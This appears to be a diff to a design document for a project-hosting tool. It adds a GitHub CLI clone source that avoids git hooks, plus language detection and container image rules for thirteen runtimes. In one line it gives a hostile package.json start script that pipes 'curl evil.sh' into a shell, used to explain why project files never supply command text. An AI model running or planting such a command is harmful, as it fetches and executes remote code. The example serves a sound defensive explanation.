@@ -16,6 +16,7 @@ so.
 | ---------------- | ------------------------------------------- | ---------------------------- |
 | `EMPTY`          | An empty directory                          | yes                          |
 | `GIT_CLONE`      | Cloned from an HTTPS git remote             | yes                          |
+| `GIT_CLONE`      | `owner/repo` via the host's `gh` login      | yes                          |
 | `REMOTE_ARCHIVE` | Downloaded from an HTTPS `.zip` / `.tar.gz` | yes                          |
 | `ZIP_UPLOAD`     | An uploaded archive                         | no — core only               |
 | `LOCAL_FOLDER`   | A folder already on the machine             | no — core only               |
@@ -24,6 +25,28 @@ so.
 
 The last four are implemented in `file-manager` and have no interface. Adding one
 is a variant in `provisioning::SourceSpec` and a radio button, not a redesign.
+
+### The GitHub CLI option
+
+A `GitHub CLI` source takes `owner/repo` (or a pasted github.com URL) and
+authenticates with the token the user's own `gh` login already holds, so a private
+repository clones with nothing typed into a token field. The dialog asks `gh`
+whether it is installed and who is logged in _before_ offering the option, so a
+user without it is told to install it or paste a token rather than meeting a
+failure at Create.
+
+**`gh repo clone` is not what runs.** That command shells out to `git`, which runs
+the repository's hooks — a `post-checkout` hook in a repository someone was talked
+into cloning would execute as that user. So `gh auth token` supplies the
+credential and the fetch stays in-process through gix, which runs no hooks. The
+`gh` login is what authenticates either way.
+
+The URL is _built_ from the parsed owner and repo and then validated like any
+other, so this path has no shortcut around §2. Names are checked against GitHub's
+own character rules before `gh` is asked for anything: a URL pointing at a pull
+request or a file is refused rather than guessing which repository it belongs to,
+another host's URL is refused rather than becoming a github.com address, and
+traversal never reaches a URL.
 
 ### Installing a CLI from GitHub
 
@@ -232,3 +255,84 @@ network:
 ```
 cargo test -p project-host-file-manager --test remote_sources_network -- --ignored
 ```
+
+---
+
+## 9. Languages, and how one is chosen
+
+### Thirteen runtimes
+
+| Runtime      | Detected by                                     | Image                                      |
+| ------------ | ----------------------------------------------- | ------------------------------------------ |
+| `NODEJS`     | `package.json`                                  | `node:22.14.0-bookworm-slim`               |
+| `TYPESCRIPT` | `package.json` + `tsconfig.json`                | two-stage node; ships without the compiler |
+| `BUN`        | `bun.lockb`, `bunfig.toml`                      | `oven/bun:1.1.42-slim`                     |
+| `DENO`       | `deno.json`, `deno.lock`                        | `denoland/deno:bin-2.1.4`                  |
+| `PYTHON`     | `requirements.txt`, `pyproject.toml`, `Pipfile` | `python:3.12.8-slim-bookworm`              |
+| `GO`         | `go.mod`                                        | builds on `golang`, ships on distroless    |
+| `RUST`       | `Cargo.toml`                                    | builds on `rust`, ships on debian-slim     |
+| `JAVA`       | `pom.xml`, `build.gradle`                       | builds on `maven`, ships on a JRE          |
+| `PHP`        | `composer.json`, `index.php`                    | `php:8.3.15-cli-bookworm`                  |
+| `RUBY`       | `Gemfile`, `config.ru`                          | `ruby:3.3.6-slim-bookworm`                 |
+| `DOTNET`     | `*.csproj`, `*.fsproj`, `*.sln`                 | builds on the SDK, ships on the runtime    |
+| `STATIC`     | `index.html`, incl. in `public/`                | `nginx:1.27.3-alpine`                      |
+| `POLYGLOT`   | more than one of the above                      | Debian with several toolchains             |
+
+### Detection is two questions, not one
+
+`signals()` answers "what is in here" — a fact. It reads **marker files a
+maintainer put there deliberately**, never a count of file extensions, because one
+vendored script would otherwise outvote the actual project.
+
+`detect()` then applies policy to that answer:
+
+- **One language** gets that language's detector, which proposes a package
+  manager, a start command and whether there is a lockfile.
+- **Several languages** get `POLYGLOT` — an image carrying every toolchain the
+  tree needs — rather than picking one and failing at build time on the other. The
+  interface names what was found so a user who disagrees can override it.
+- **None** is an error, not a default. Building a project as the wrong runtime
+  produces a container that exits immediately, so the message names every marker
+  file that was looked for.
+
+Three precedence rules worth knowing: Deno and Bun beat Node when their own
+manifests are present (nobody adds `deno.json` to a Node project); TypeScript is
+its own runtime because a compile step is a different image, not a different
+interpreter; and an `index.html` beside a real application is that application's
+template, not a second project.
+
+### What the user is asked
+
+Nothing, for anything fetched. The dialog defaults to **Detect automatically** and
+reports afterwards what the files turned out to be, along with any detection
+warnings. "Choose it myself" lists all thirteen. An empty project has no files, so
+it still asks — detection would only report finding nothing.
+
+The list the interface offers comes from the same table the planner uses, so it
+cannot offer a language that then fails at Create.
+
+### What a project's own files can and cannot influence
+
+Detection may choose **which** script runs. It never supplies the **text** of a
+command: a `start` script becomes `<manager> run start`, so a `package.json`
+containing `"start": "node s.js; curl evil.sh | sh"` produces `pnpm run start` and
+the shell metacharacters stay inside the script, where the container's own
+sandboxing applies. Every default command is a constant in `runtime_plan`.
+
+### Images
+
+Generated from the project's plan rather than from a fixed template, so a
+repository whose start command is `npm run serve` gets an image that runs it.
+Every one: a pinned base (never `:latest`), uid 10001 non-root, and
+`CMD ["sh","-c","exec …"]` — the `exec` matters, because without it the shell
+stays PID 1, swallows `SIGTERM`, and every stop waits out the kill timeout.
+Compiled runtimes build in one stage and ship from another, so a service does not
+carry a compiler.
+
+The install step deliberately has no `|| true`. The templates this replaced ended
+theirs with it, which turns a failed dependency install into a container that
+starts and then fails obscurely.
+
+**None of these images has ever been built.** There is no Docker daemon here.
+Their _shape_ is asserted — pinned, non-root, multi-stage where it matters, valid
+JSON in `CMD` — and their behaviour is unproven.
